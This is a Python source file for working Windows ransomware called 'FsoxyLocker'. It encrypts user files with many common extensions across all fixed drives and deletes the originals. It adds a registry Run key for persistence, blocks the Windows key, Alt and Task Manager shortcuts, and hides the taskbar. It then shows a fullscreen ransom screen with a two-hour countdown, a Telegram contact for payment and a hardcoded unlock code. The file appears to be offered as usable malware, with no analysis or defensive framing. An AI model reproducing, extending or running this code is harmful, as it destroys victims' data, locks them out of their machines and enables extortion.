import os
import sys
import ctypes
import subprocess
import threading
import tkinter as tk
from PIL import Image, ImageTk
import keyboard
from cryptography.fernet import Fernet
import winreg

TARGET_EXTENSIONS = (".mp4", ".docx", ".xlsx", ".pdf", ".pptx", ".mp3", ".avi", ".mkv", ".jpg", ".png", ".txt", ".csv", ".html", ".zip", ".rar", ".7z", ".dll", ".iso", ".bat", ".ps1", ".vbs", ".js", ".json", ".xml", ".sql", ".rtf", ".odt", ".ods", ".odp", ".wma", ".flac", ".mov", ".mpeg", ".mpg", ".wav", ".aac", ".m4a", ".flv", ".swf", ".epub", ".mobi", ".azw3", ".djvu", ".tiff", ".bmp", ".ico", ".svg", ".psd", ".ai", ".eps", ".indd", ".raw")
TARGET_DELETE_PATH = r"C:\Windows\System32" 

KEY_FILE_PATH = os.path.expanduser(r"~\AppData\Local\sys_cache.key")

def get_or_create_key():
    if os.path.exists(KEY_FILE_PATH):
        try:
            with open(KEY_FILE_PATH, "rb") as f:
                return f.read()
        except Exception:
            pass
    
    new_key = Fernet.generate_key()
    try:
        os.makedirs(os.path.dirname(KEY_FILE_PATH), exist_ok=True)
        with open(KEY_FILE_PATH, "wb") as f:
            f.write(new_key)
    except Exception as e:
        print(f"[!] Không thể lưu file key: {e}")
    return new_key

SESSION_KEY = get_or_create_key()

encryption_finished = False
encrypted_files_count = 0

EXCLUDED_DIRS = {
    "windows", "program files", "program files (x86)", 
    "programdata", "system volume information", "$recycle.bin", 
    "msocache", "recovery", "perflogs", "appdata", "local settings"
}

def get_all_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in range(26):
        if bitmask & (1 << letter):
            drive_name = f"{chr(65 + letter)}:\\"
            if ctypes.windll.kernel32.GetDriveTypeW(drive_name) == 3:
                drives.append(drive_name)
    return drives

def add_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        script_path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, "FsoxyLocker", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[!] Không thể thiết lập Persistence: {e}")

def remove_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "FsoxyLocker")
        winreg.CloseKey(key)
    except Exception:
        pass

def remove_key_file():
    try:
        if os.path.exists(KEY_FILE_PATH):
            os.remove(KEY_FILE_PATH)
    except Exception:
        pass

def encrypt_files_in_all_drives():
    global encryption_finished, encrypted_files_count
    try:
        f = Fernet(SESSION_KEY)
        drives = get_all_drives()
        
        for drive_path in drives:
            if not os.path.exists(drive_path):
                continue
                
            for root, dirs, files in os.walk(drive_path):
                dirs[:] = [d for d in dirs if d.lower() not in EXCLUDED_DIRS]
                
                for filename in files:
                    if filename == "wp_cache.txt":
                        continue
                    
                    if filename.endswith(TARGET_EXTENSIONS):
                        file_path = os.path.join(root, filename)
                        try:
                            if os.path.isfile(file_path) and not filename.endswith(".Fsoxy"):
                                with open(file_path, "rb") as file:
                                    data = file.read()
                                
                                encrypted_data = f.encrypt(data)
                                
                                locked_path = file_path + ".Fsoxy"
                                with open(locked_path, "wb") as file:
                                    file.write(encrypted_data)
                                
                                os.remove(file_path)
                                encrypted_files_count += 1
                        except Exception as e:
                            print(f"[!] Bỏ qua file {file_path}: {e}")
        print("[+] done.")
    except Exception as e:
        print(f"[!] error: {e}")
    finally:
        encryption_finished = True

def decrypt_files_in_all_drives():
    try:
        f_obj = Fernet(SESSION_KEY)
        drives = get_all_drives()
        
        for drive_path in drives:
            if not os.path.exists(drive_path):
                continue
                
            for root, dirs, files in os.walk(drive_path):
                dirs[:] = [d for d in dirs if d.lower() not in EXCLUDED_DIRS]
                
                for filename in files:
                    if filename.endswith(".Fsoxy"):
                        file_path = os.path.join(root, filename)
                        try:
                            if os.path.isfile(file_path):
                                with open(file_path, "rb") as file:
                                    encrypted_data = file.read()
                                
                                decrypted_data = f_obj.decrypt(encrypted_data)
                                
                                original_path = file_path[:-6] 
                                with open(original_path, "wb") as file:
                                    file.write(decrypted_data)
                                
                                os.remove(file_path)
                        except Exception as e:
                            print(f"[!] error {file_path}: {e}")
        print("[+] done.")
    except Exception as e:
        print(f"[!] error: {e}")

try:
    keyboard.block_key("windows")
    keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
    keyboard.block_key("alt")
except Exception:
    pass
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

def toggle_taskbar(show):
    hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 5 if show else 0)

def setup_window_buttons(root):
    root.update_idletasks()
    try:
        hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
        if not hwnd:
            hwnd = root.winfo_id()
            
        hMenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
        if hMenu:
            ctypes.windll.user32.EnableMenuItem(hMenu, 0xF060, 0x00000000 | 0x00000001) 
            ctypes.windll.user32.EnableMenuItem(hMenu, 0xF030, 0x00000000 | 0x00000001) 
    except Exception:
        pass

class WannaLock:
    def __init__(self, root):
        self.root = root
        self.total_time = 7200
        self.time_left = 7200  
        
        self.root.title("FsoxyLocker - your files have been locked")
        self.root.attributes("-fullscreen", True)
        self.root.configure(bg="#000000", cursor="none")
        
        setup_window_buttons(self.root)
        toggle_taskbar(False)
        add_persistence()
        
        threading.Thread(target=encrypt_files_in_all_drives, daemon=True).start()
        
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.update_timer()

    def create_widgets(self):
        lbl_title = tk.Label(self.root, text="oops!your files have been locked",  
                             fg="#dc143c", bg="#000000", font=("Consolas", 40, "bold"), cursor="none")
        lbl_title.pack(anchor="center", padx=60, pady=(120, 75))
       
        image_path = resource_path("pic.bmp")
        if os.path.exists(image_path):
            img_pil = Image.open(image_path)
            img_pil = img_pil.resize((300,300), Image.Resampling.LANCZOS)
            self.img_tk = ImageTk.PhotoImage(img_pil)
            lbl_img = tk.Label(self.root, image=self.img_tk, bg="#000000", cursor="none")
            lbl_img.pack(pady=(20, 15)) 

        self.lbl_timer = tk.Label(self.root, text="", fg="#dc143c", bg="#000000", font=("Consolas", 35, "bold"), cursor="none")
        self.lbl_timer.pack(pady=5) 

        self.canvas_width = 600
        self.canvas_height = 30
        self.progress_canvas = tk.Canvas(self.root, width=self.canvas_width, height=self.canvas_height, 
                                         bg="#000000", highlightthickness=1, highlightbackground="#646464", cursor="none")
        self.progress_canvas.pack(pady=(8, 5))
        self.progress_rect = self.progress_canvas.create_rectangle(2, 2, self.canvas_width-2, self.canvas_height-2, fill="#dc143c", outline="")

        self.lbl_file_count = tk.Label(self.root, text="encrypted files: 0", fg="#dc143c", bg="#000000", font=("Consolas", 14, "bold"), cursor="none")
        self.lbl_file_count.pack(pady=(0, 8)) 

        lbl_instruction = tk.Label(self.root, text="contact telegram:@L1NUX_1987 to get the unlock code", 
                                   fg="#c8c8c8", bg="#000000", font=("Consolas", 20), cursor="none")
        lbl_instruction.pack(pady=(30, 25))
        frame_input = tk.Frame(self.root, bg="#0f0f0f", cursor="none")
        frame_input.pack()

        self.entry_code = tk.Entry(frame_input, show="*", font=("Consolas", 14), justify="center", width=18, cursor="none")
        self.entry_code.pack(side=tk.LEFT, padx=5)
        self.entry_code.focus_set()
        
        self.entry_code.bind("<Return>", lambda event: self.check_code())

        btn_unlock = tk.Button(frame_input, text="unlock", command=self.check_code, font=("Consolas", 16, "bold"), bg="#dc143c", fg="white", relief="flat", padx=12, pady=2, cursor="none")
        btn_unlock.pack(side=tk.LEFT, padx=5)

        self.lbl_status = tk.Label(self.root, text="", fg="#dc143c", bg="#0f0f0f", font=("Consolas", 16, "bold"), cursor="none")
        self.lbl_status.pack(pady=(5, 20))


    def update_timer(self):
        if self.time_left > 0:
            hours = self.time_left // 3600
            minutes = (self.time_left % 3600) // 60
            seconds = self.time_left % 60
            self.lbl_timer.config(text=f"time left to restore your files:\n{hours:02d}:{minutes:02d}:{seconds:02d}")
            
            timer_ratio = self.time_left / self.total_time
            current_width = int(timer_ratio * (self.canvas_width - 4))
            if current_width < 0:
                current_width = 0
            self.progress_canvas.coords(self.progress_rect, 2, 2, 2 + current_width, self.canvas_height - 2)
            
            status_text = f"encrypted files: {encrypted_files_count}" + ("" if encryption_finished else " (encrypting)")
            self.lbl_file_count.config(text=status_text)
            
            self.time_left -= 1
            self.root.after(1000, self.update_timer) 
        else:
            self.self_destruct()

    def check_code(self):
        code = self.entry_code.get()
        if code == "PZXj8?Q98k0,":
            if not encryption_finished:
                self.lbl_status.config(text="decrypting")
                return
            
            self.lbl_status.config(text="decrypting", fg="#dc143c")
            threading.Thread(target=self._run_decryption, daemon=True).start()
        else:
                self.lbl_status.config(text=f"wrong code", fg="#dc143c")

    def _run_decryption(self):
        decrypt_files_in_all_drives()
        # restore_desktop_background()
        remove_persistence()
        remove_key_file()
        self.root.after(1000, self.quit_app)

    def quit_app(self):
        try:
            self.root.destroy()
        except:
            pass
        toggle_taskbar(True)
        sys.exit()

    def self_destruct(self):
        toggle_taskbar(True)
        remove_persistence()
        try:
            self.root.destroy()
        except:
            pass
        sys.exit()

if __name__ == "__main__":
    root = tk.Tk()
    app = WannaLock(root)
    root.mainloop()
